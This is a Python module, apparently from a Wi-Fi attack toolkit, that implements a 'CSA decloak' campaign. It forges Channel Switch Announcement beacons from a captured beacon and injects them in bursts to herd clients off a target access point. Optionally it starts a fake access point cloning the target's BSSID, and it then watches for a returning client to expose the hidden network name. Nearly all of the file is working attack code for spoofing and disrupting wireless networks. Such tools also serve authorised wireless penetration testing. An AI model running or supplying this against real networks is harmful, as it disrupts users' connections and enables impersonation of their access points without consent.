from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass
from typing import Callable, Iterable, List, Optional

from wifit3.campaigns.campaign import Campaign
from wifit3.dot11 import str_to_mac
from wifit3.dot11.ap import beacon_clone
from wifit3.dot11.chan import same_band
from wifit3.dot11.csa import build_csa_beacon

logger = logging.getLogger(__name__)

_CSA_BURST = 16
_CSA_GAP_SEC = 0.002


@dataclass(frozen=True)
class CsaDecloakInput:
    sender_iface: object
    listener_iface: object
    dest_channel: int
    count: int = 0
    duration_s: float = 20.0
    settle_s: float = 2.0
    stand_up_ap: bool = False


def csa_dest_channels(ap_channel: int, supported: Iterable[int]) -> List[int]:
    return [c for c in sorted(set(supported)) if c != ap_channel and same_band(c, ap_channel)]


def csa_default_dest(ap_channel: int, options: List[int]) -> Optional[int]:
    if not options:
        return None
    classic = [6, 1, 11] if ap_channel <= 14 else [36, 40, 44]
    return next((c for c in classic if c in options), options[0])


class CsaDecloakCampaign(Campaign):
    key = "decloak"

    def __init__(self, array, target, plan: CsaDecloakInput,
                 log: Optional[Callable[[str], None]] = None):
        super().__init__(ap=target, array=array)
        self.csa = plan
        self._log = log or (lambda _message: None)
        self._iface = plan.sender_iface
        self.revealed: Optional[str] = None
        self.tried = 0
        self._original_channels: list[tuple[object, int]] = []
        for iface in (plan.sender_iface, plan.listener_iface):
            if any(saved_iface is iface for saved_iface, _ in self._original_channels):
                continue
            channel = getattr(iface, "current_channel", None)
            if isinstance(channel, int):
                self._original_channels.append((iface, channel))

    def status_under_card(self) -> str:
        return "● CSA Decloak"

    def status_headlines(self, vault) -> list[str]:
        return [f"[bold cyan]● CSA Decloak[/bold cyan] → CH {self.csa.dest_channel}",
                "[dim]waiting for a returning client to reveal the SSID[/dim]"]

    async def _loop(self) -> None:
        plan = self.csa
        beacon = self.ap.last_beacon_frame
        if not beacon:
            raise RuntimeError(f"no beacon captured for {self.ap.bssid}")
        if self.ap.channel not in plan.sender_iface.supported_channels:
            raise RuntimeError(f"sender cannot tune to channel {self.ap.channel}")
        if plan.dest_channel == self.ap.channel or not same_band(
            plan.dest_channel, self.ap.channel,
        ):
            raise RuntimeError(f"invalid destination channel {plan.dest_channel}")
        if plan.dest_channel not in plan.listener_iface.supported_channels:
            raise RuntimeError(f"listener cannot tune to channel {plan.dest_channel}")
        frame = build_csa_beacon(beacon, plan.dest_channel,
                                 from_channel=self.ap.channel, count=plan.count)
        single = plan.listener_iface is plan.sender_iface
        overlap = plan.stand_up_ap and not single
        bssid_lower = self.ap.bssid.lower()
        initial = self.array.access_points.get(bssid_lower, self.ap).ssid
        logger.info("[DECLOAK/CSA] %s: herding clients ch %s -> %s (%s)", self.ap.bssid,
                    self.ap.channel, plan.dest_channel,
                    "decoy AP on dest" if overlap
                    else "time-sliced single card" if single else "passive listen on 2nd card")
        fakeap = None
        ignoring = False
        self.array.register_decloak_probe_context(
            self.ap.bssid, plan.listener_iface, plan.dest_channel,
        )
        try:
            try:
                if overlap:
                    from wifit3.campaigns.eviltwin.fake_ap import FakeAP
                    decoy_beacon = beacon_clone(beacon, plan.dest_channel, None)
                    self.array.ignore_stray_beacons(self.ap.bssid, plan.dest_channel)
                    ignoring = True
                    fakeap = FakeAP(
                        plan.listener_iface,
                        str_to_mac(self.ap.bssid),
                        self.ap.ssid or "",
                        plan.dest_channel,
                        decoy_beacon,
                        rx_source=plan.listener_iface,
                    )
                    await fakeap.start()
                elif not single and plan.listener_iface.current_channel != plan.dest_channel:
                    tuned = await plan.listener_iface.set_channel(plan.dest_channel)
                    if tuned is False:
                        raise RuntimeError(
                            f"listener failed to tune to channel {plan.dest_channel}"
                        )

                deadline = time.monotonic() + plan.duration_s
                while not self.stopped and time.monotonic() < deadline:
                    if plan.sender_iface.current_channel != self.ap.channel:
                        tuned = await plan.sender_iface.set_channel(self.ap.channel)
                        if tuned is False:
                            raise RuntimeError(
                                f"sender failed to tune to channel {self.ap.channel}"
                            )
                    for _ in range(_CSA_BURST):
                        if self.stopped:
                            return
                        sent = await plan.sender_iface.send_no_wait(frame)
                        if sent is False:
                            raise RuntimeError("CSA beacon injection failed")
                        await asyncio.sleep(_CSA_GAP_SEC)
                    if single:
                        tuned = await plan.sender_iface.set_channel(plan.dest_channel)
                        if tuned is False:
                            raise RuntimeError(
                                f"listener failed to tune to channel {plan.dest_channel}"
                            )
                    if await self._await_reveal(bssid_lower, initial, plan.settle_s):
                        return
                logger.info(
                    "[DECLOAK/CSA] %s: no client returned before timeout", self.ap.bssid,
                )
            finally:
                try:
                    if fakeap is not None:
                        await fakeap.stop()
                finally:
                    if ignoring:
                        self.array.stop_ignoring_stray_beacons(self.ap.bssid)
        finally:
            self.array.unregister_decloak_probe_context(self.ap.bssid, plan.listener_iface)

    async def _await_reveal(self, bssid: str, initial: Optional[str], settle_s: float) -> bool:
        settled = 0.0
        while settled < settle_s and not self.stopped:
            ap_state = self.array.access_points.get(bssid)
            if ap_state and ap_state.ssid and ap_state.ssid != initial:
                self.revealed = ap_state.ssid
                logger.info("[DECLOAK/CSA] revealed %s -> %r", self.ap.bssid, self.revealed)
                return True
            await asyncio.sleep(0.05)
            settled += 0.05
        return False

    async def teardown(self) -> None:
        restore_error = None
        for iface, channel in self._original_channels:
            try:
                if iface.current_channel == channel:
                    continue
                restored = await iface.set_channel(channel)
                if restored is False:
                    raise RuntimeError(f"card failed to restore channel {channel}")
            except Exception as exc:
                logger.exception("[DECLOAK/CSA] channel restore failed")
                restore_error = restore_error or exc
        if restore_error is not None:
            raise restore_error
